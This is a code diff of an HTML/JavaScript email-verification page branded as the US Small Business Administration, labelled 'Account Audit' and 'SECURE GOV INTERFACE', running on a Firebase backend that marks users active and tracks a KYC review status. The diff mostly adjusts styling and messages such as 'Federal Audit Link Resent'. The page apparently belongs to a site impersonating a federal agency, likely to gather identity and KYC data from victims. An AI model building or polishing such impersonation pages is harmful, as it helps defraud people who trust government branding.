@@ -9,7 +9,7 @@
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Public+Sans:wght@400;700;900&display=swap');
         :root { --sba-blue: #002e6d; --sba-red: #cc0000; }
-        body { font-family: 'Public Sans', sans-serif; background-color: #f1f5f9; -webkit-tap-highlight-color: transparent; }
+        body { font-family: 'Public Sans', sans-serif; background-color: #f1f5f9; }
         
         .gov-top { background: #f0f0f0; color: #444; font-size: 9px; padding: 6px 15px; border-bottom: 1px solid #ddd; font-weight: 700; }
         .sba-logo-box { position: relative; display: inline-block; padding: 2px 6px; }
@@ -18,7 +18,6 @@
 
         .auth-card { background: white; border-top: 5px solid var(--sba-blue); box-shadow: 0 4px 20px rgba(0,0,0,0.05); border-radius: 2px; }
         .btn-sba { background-color: var(--sba-blue); transition: all 0.2s; font-size: 11px; font-weight: 900; letter-spacing: 1px; }
-        .btn-sba:active { transform: scale(0.98); opacity: 0.9; }
 
         .verify-pulse { animation: pulse-blue 2s infinite; border-radius: 50%; }
         @keyframes pulse-blue {
@@ -26,8 +25,6 @@
             70% { box-shadow: 0 0 0 10px rgba(0, 46, 109, 0); }
             100% { box-shadow: 0 0 0 0 rgba(0, 46, 109, 0); }
         }
-        
-        #displayEmail { text-transform: none !important; word-break: break-all; }
     </style>
 </head>
 <body class="min-h-screen flex flex-col">
@@ -40,7 +37,7 @@
         <span class="opacity-40">Node-V15</span>
     </div>
 
-    <header class="bg-white border-b border-gray-100 py-3 px-6 flex justify-center shadow-sm">
+    <header class="bg-white border-b border-gray-100 py-4 px-6 flex justify-center shadow-sm">
         <div class="flex items-center gap-2">
             <div class="sba-logo-box"><span class="text-lg font-black text-[#002e6d] tracking-tighter uppercase">SBA</span></div>
             <p class="text-[9px] font-black text-[#002e6d] uppercase leading-none">Administration</p>
@@ -49,50 +46,50 @@
 
     <main class="flex-grow flex items-center justify-center p-4">
         <div class="w-full max-w-[360px]">
-            <div class="auth-card p-6 border border-gray-200">
+            <div class="auth-card p-8 border border-gray-200">
                 
-                <div class="mb-5 text-center">
-                    <div class="w-12 h-12 bg-slate-50 text-[#002e6d] flex items-center justify-center mx-auto mb-3 border border-[#002e6d] verify-pulse">
-                        <i class="fas fa-user-check text-lg"></i>
+                <div class="mb-6 text-center">
+                    <div class="w-14 h-14 bg-slate-50 text-[#002e6d] flex items-center justify-center mx-auto mb-4 border border-[#002e6d] verify-pulse">
+                        <i class="fas fa-user-check text-xl"></i>
                     </div>
-                    <h2 class="text-lg font-black text-slate-800 uppercase tracking-tighter">Account Audit</h2>
-                    <p class="text-slate-400 text-[8px] font-black uppercase tracking-[0.2em] mt-1">Pending Link Activation</p>
+                    <h2 class="text-xl font-black text-slate-800 uppercase tracking-tighter">Account Audit</h2>
+                    <p class="text-slate-400 text-[9px] font-black uppercase tracking-[0.2em] mt-2">Activation Link Dispatched</p>
                 </div>
 
-                <div class="mb-5 text-center bg-slate-50 p-3 border border-slate-100">
-                    <p class="text-[8px] text-slate-400 font-bold uppercase mb-1">Authorization Link Sent To:</p>
-                    <span id="displayEmail" class="text-[#002e6d] text-xs font-black">loading...</span>
+                <div class="mb-6 text-center bg-slate-50 p-4 border border-slate-100 rounded">
+                    <p class="text-[9px] text-slate-400 font-bold uppercase mb-1">Verify Ownership Of:</p>
+                    <span id="displayEmail" class="text-[#002e6d] text-xs font-black break-all">loading...</span>
                 </div>
 
-                <div id="alertBox" class="hidden mb-4 p-3 bg-red-50 border-l-3 border-red-600 text-red-700 text-[9px] font-black uppercase italic"></div>
+                <div id="alertBox" class="hidden mb-4 p-3 bg-red-50 border-l-4 border-red-600 text-red-700 text-[10px] font-black uppercase italic"></div>
 
-                <div class="space-y-3">
-                    <div class="p-3 bg-[#001a3d] border border-[#002e6d]">
-                        <p class="text-white text-[9px] font-bold uppercase tracking-wider leading-relaxed text-center">
-                            The system will <span class="text-sky-400">auto-advance</span><br>immediately upon verification.
+                <div class="space-y-4">
+                    <div class="p-4 bg-[#001a3d] border border-[#002e6d]">
+                        <p class="text-white text-[10px] font-bold uppercase tracking-wider leading-relaxed text-center">
+                            The system will <span class="text-sky-400">auto-advance</span><br>immediately upon clicking link.
                         </p>
                     </div>
                     
-                    <button id="checkBtn" class="btn-sba w-full text-white py-4 rounded-sm shadow-lg uppercase">
-                        Refresh Status
+                    <button id="checkBtn" class="btn-sba w-full text-white py-4 shadow-lg uppercase">
+                        Manual Refresh
                     </button>
                 </div>
 
-                <div class="mt-6 text-center border-t pt-4 border-slate-50">
-                    <button id="resendBtn" class="text-red-600 font-black text-[9px] uppercase tracking-widest hover:underline">
+                <div class="mt-8 text-center border-t pt-5 border-slate-50">
+                    <button id="resendBtn" class="text-red-600 font-black text-[10px] uppercase tracking-widest hover:underline">
                         Resend Security Link
                     </button>
                 </div>
             </div>
 
-            <button id="logoutBtn" class="w-full mt-6 text-slate-400 text-[8px] font-black uppercase tracking-[0.3em]">
-                <i class="fas fa-power-off mr-1"></i> Terminate Session
+            <button id="logoutBtn" class="w-full mt-8 text-slate-400 text-[9px] font-black uppercase tracking-[0.4em]">
+                <i class="fas fa-power-off mr-2"></i> Terminate Session
             </button>
         </div>
     </main>
 
-    <footer class="py-4 text-center text-[8px] text-slate-400 font-bold uppercase tracking-widest">
-        SECURE GOV INTERFACE © 2026
+    <footer class="py-6 text-center text-[9px] text-slate-400 font-bold uppercase tracking-widest">
+        SECURE GOV INTERFACE © 2026 | Node-15
     </footer>
 
     <script type="module">
@@ -104,34 +101,37 @@
         const alertBox = document.getElementById('alertBox');
         const checkBtn = document.getElementById('checkBtn');
 
+        let checkInterval;
+
         onAuthStateChanged(auth, (user) => {
             if (!user) {
                 window.location.href = "login.html";
             } else {
                 displayEmail.innerText = user.email;
                 
-                // Real-time checking every 3 seconds
-                const interval = setInterval(async () => {
+                // Real-time automatic checking every 3 seconds
+                checkInterval = setInterval(async () => {
                     await user.reload();
                     if (user.emailVerified) {
-                        clearInterval(interval);
-                        await finalize(user);
+                        clearInterval(checkInterval);
+                        await finalizeAudit(user);
                     }
                 }, 3000);
             }
         });
 
-        async function finalize(user) {
+        async function finalizeAudit(user) {
             try {
+                // Update Firestore to mark user as active/verified
                 await updateDoc(doc(db, "users", user.uid), {
                     isVerified: true,
                     accountStatus: "ACTIVE",
-                    kycStatus: "PENDING_AUDIT"
+                    kycStatus: "PENDING_REVIEWS" 
                 });
-                window.location.href = "welcome.html";
+                window.location.href = "welcome.html"; 
             } catch (e) { 
                 console.error("Sync Error:", e);
-                window.location.href = "welcome.html"; // Fallback redirect
+                window.location.href = "welcome.html"; // Redirect even if sync delays
             }
         }
 
@@ -140,29 +140,30 @@
             if (!user) return;
             
             checkBtn.disabled = true;
-            checkBtn.innerHTML = '<i class="fas fa-circle-notch fa-spin"></i>';
+            checkBtn.innerHTML = '<i class="fas fa-spinner fa-spin mr-2"></i> SCANNING...';
             
             await user.reload();
             if (user.emailVerified) {
-                finalize(user);
+                finalizeAudit(user);
             } else {
-                alertBox.innerText = "LINK NOT ACTIVATED. CHECK YOUR INBOX OR SPAM.";
+                alertBox.innerText = "LINK NOT ACTIVATED. CHECK INBOX AND SPAM FOLDERS.";
                 alertBox.classList.remove('hidden');
                 checkBtn.disabled = false;
-                checkBtn.innerText = 'Refresh Status';
+                checkBtn.innerText = 'Manual Refresh';
             }
         };
 
         document.getElementById('resendBtn').onclick = async () => {
             try {
                 await sendEmailVerification(auth.currentUser);
-                alert("Federal Audit Link Resent. Check your inbox.");
+                alert("Security Link Resent Successfully.");
             } catch (err) { 
-                alert("Rate limit exceeded. Try again in 60 seconds."); 
+                alert("Please wait 60 seconds before requesting a new link."); 
             }
         };
 
         document.getElementById('logoutBtn').onclick = () => {
+            if(checkInterval) clearInterval(checkInterval);
             signOut(auth).then(() => { window.location.href = "login.html"; });
         };
     </script>
